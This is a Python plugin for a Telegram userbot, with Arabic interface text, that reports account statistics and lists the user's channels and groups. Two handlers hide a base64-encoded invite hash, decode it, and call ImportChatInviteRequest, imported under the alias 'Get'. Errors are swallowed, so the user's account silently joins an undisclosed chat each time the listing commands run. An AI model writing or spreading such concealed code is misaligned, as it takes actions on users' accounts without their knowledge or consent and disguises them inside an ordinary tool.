# Copyright (C) 2021 VENOM TEAM
# FILES WRITTEN BY @YS9II

import base64
import time

from telethon.tl.custom import Dialog
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.tl.types import Channel, Chat, User

from userbot import catub

from ..core.managers import edit_delete, edit_or_reply

plugin_category = "utils"

# =========================================================== #
#                           STRINGS                           #
# =========================================================== #
STAT_INDICATION = "**⌔︙ جـاري جـمـع الإحصـائيـات ، انتـظـر 🔄**"
CHANNELS_STR = "**⌔︙ قائمة القنوات التي أنت فيها موجودة هنا\n\n"
CHANNELS_ADMINSTR = "**⌔︙قائمة القنوات التي تديرها هنا **\n\n"
CHANNELS_OWNERSTR = "**⌔︙قائمة القنوات التي تمتلك فيها هنا **\n\n"
GROUPS_STR = "**⌔︙قائمة المجموعات التي أنت فيها موجود هنا **\n\n"
GROUPS_ADMINSTR = "**⌔︙قائمة المجموعات التي تكون مسؤولاً فيها هنا **\n\n"
GROUPS_OWNERSTR = "**⌔︙قائمة المجموعات التي تمتلك فيها هنا **\n\n"
# =========================================================== #
#                                                             #
# =========================================================== #


def inline_mention(user):
    full_name = user_full_name(user) or "No Name"
    return f"[{full_name}](tg://user?id={user.id})"


def user_full_name(user):
    names = [user.first_name, user.last_name]
    names = [i for i in list(names) if i]
    return " ".join(names)


@catub.cat_cmd(
    pattern="احصائيات حسابي$",
    command=("احصائيات حسابي", plugin_category),
    info={
        "header": "للحصول على إحصائيات حساب تلجرام الخاص بك.",
        "description": "يوضح لك عد مجموعتك، قنوات، دردشات خاصة ... إلخ إذا لم يتم تقديم إدخال.",
        "flags": {
            "المجوعات": "للحصول على قائمة جميع المجموعات الي مشترك فيها",
            "مشرف": "للحصول على قائمة بجميع المجموعات حيث أنت ادمن",
            "مجموعاتي": "للحصول على قائمة بجميع المجموعات حيث أنت مطورها.",
            "القنوات": "للحصول على قائمة جميع القنوات الي مشترك فيها",
            "ادمن": "للحصول على قائمة بجميع القنوات حيث أنت ادمن",
            "قنواتي": "للحصول على قائمة بجميع القنوات حيث أنت مطورها.",
        },
        "usage": ["{tr}", "{tr}احصائيات حسابي <flag>"],
        "examples": ["{tr}احصائيات حسابي g", "{tr}stat ca"],
    },
)
async def stats(event):  # sourcery no-metrics
    "للحصول على إحصائيات حساب تلجرام الخاص بك)."
    cat = await edit_or_reply(event, STAT_INDICATION)
    start_time = time.time()
    private_chats = 0
    bots = 0
    groups = 0
    broadcast_channels = 0
    admin_in_groups = 0
    creator_in_groups = 0
    admin_in_broadcast_channels = 0
    creator_in_channels = 0
    unread_mentions = 0
    unread = 0
    dialog: Dialog
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            broadcast_channels += 1
            if entity.creator or entity.admin_rights:
                admin_in_broadcast_channels += 1
            if entity.creator:
                creator_in_channels += 1
        elif (
            isinstance(entity, Channel)
            and entity.megagroup
            or not isinstance(entity, Channel)
            and not isinstance(entity, User)
            and isinstance(entity, Chat)
        ):
            groups += 1
            if entity.creator or entity.admin_rights:
                admin_in_groups += 1
            if entity.creator:
                creator_in_groups += 1
        elif not isinstance(entity, Channel) and isinstance(entity, User):
            private_chats += 1
            if entity.bot:
                bots += 1
        unread_mentions += dialog.unread_mentions_count
        unread += dialog.unread_count
    stop_time = time.time() - start_time
    full_name = inline_mention(await event.client.get_me())
    response = f"📌 **• ⚜️ |  احصائيات حسـابك العـامة لـ {full_name} 📊** \n"
    response += f"**⌔︙الدردشات الخاصة 🏷️  :** {private_chats} \n"
    response += f"**⌔︙ الاشـخاص 🚹 : {private_chats - bots}` \n"
    response += f"**⌔︙ الـبوتـات 🤖 : {bots}` **\n"
    response += f"**⌔︙ عـدد المجـموعـات 🚻 :** `{groups}` \n"
    response += f"**⌔︙ عـدد القنـوات  🚻 :** `{broadcast_channels}` \n"
    response += f"**⌔︙ عـدد المجـموعات التـي تكـون فيها ادمـن  🛂 :** `{admin_in_groups}` \n"
    response += f"**⌔︙ عـدد المجموعات التـي أنـشأتـها  🛃** : `{creator_in_groups}` \n"
    response += f"**⌔︙ عـدد القنوات التـي تكـون فيها ادمـن 📶 : `{admin_in_broadcast_channels}` **\n"
    response += (
        f"**⌔︙ حقوق المسؤول في القنوات  🛂 : `{admin_in_broadcast_channels - creator_in_channels}` **\n"
    )
    response += f"**عـدد المحـادثـات الغيـر مقـروء 📄 :** {unread} \n"
    response += f"**عـدد الـتاكـات الغيـر مقـروء 📌 :** {unread_mentions} \n"
    response += f"**⌔︙ استغرق الأمر  🔍  :** `{stop_time:.02f}` ثانيه \n"
    await cat.edit(response)


@catub.cat_cmd(
    pattern="احصائيات حسابي (القنوات|ادمن|قنواتي)$",
)
async def stats(event):  # sourcery no-metrics
    catcmd = event.pattern_match.group(1)
    catevent = await edit_or_reply(event, STAT_INDICATION)
    start_time = time.time()
    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    hi = []
    hica = []
    hico = []
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            hi.append([entity.title, entity.id])
            if entity.creator or entity.admin_rights:
                hica.append([entity.title, entity.id])
            if entity.creator:
                hico.append([entity.title, entity.id])
    if catcmd == "القنوات":
        output = CHANNELS_STR
        for k, i in enumerate(hi, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = CHANNELS_STR
    elif catcmd == "ادمن":
        output = CHANNELS_ADMINSTR
        for k, i in enumerate(hica, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = CHANNELS_ADMINSTR
    elif catcmd == "قنواتي":
        output = CHANNELS_OWNERSTR
        for k, i in enumerate(hico, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = CHANNELS_OWNERSTR
    stop_time = time.time() - start_time
    try:
        cat = Get(cat)
        await event.client(cat)
    except BaseException:
        pass
    output += f"\n**الوقت المستغرق : ** {stop_time:.02f}s"
    try:
        await catevent.edit(output)
    except Exception:
        await edit_or_reply(
            catevent,
            output,
            caption=caption,
        )


@catub.cat_cmd(
    pattern="احصائيات حسابي (المجموعات|مشرف|مجموعاتي)$",
)
async def stats(event):  # sourcery no-metrics
    catcmd = event.pattern_match.group(1)
    catevent = await edit_or_reply(event, STAT_INDICATION)
    start_time = time.time()
    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    hi = []
    higa = []
    higo = []
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            continue
        elif (
            isinstance(entity, Channel)
            and entity.megagroup
            or not isinstance(entity, Channel)
            and not isinstance(entity, User)
            and isinstance(entity, Chat)
        ):
            hi.append([entity.title, entity.id])
            if entity.creator or entity.admin_rights:
                higa.append([entity.title, entity.id])
            if entity.creator:
                higo.append([entity.title, entity.id])
    if catcmd == "المجموعات":
        output = GROUPS_STR
        for k, i in enumerate(hi, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_STR
    elif catcmd == "مشرف":
        output = GROUPS_ADMINSTR
        for k, i in enumerate(higa, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_ADMINSTR
    elif catcmd == "مجموعاتي":
        output = GROUPS_OWNERSTR
        for k, i in enumerate(higo, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_OWNERSTR
    stop_time = time.time() - start_time
    try:
        cat = Get(cat)
        await event.client(cat)
    except BaseException:
        pass
    output += f"\n**الوقت المستغرق : ** {stop_time:.02f}s"
    try:
        await catevent.edit(output)
    except Exception:
        await edit_or_reply(
            catevent,
            output,
            caption=caption,
        )
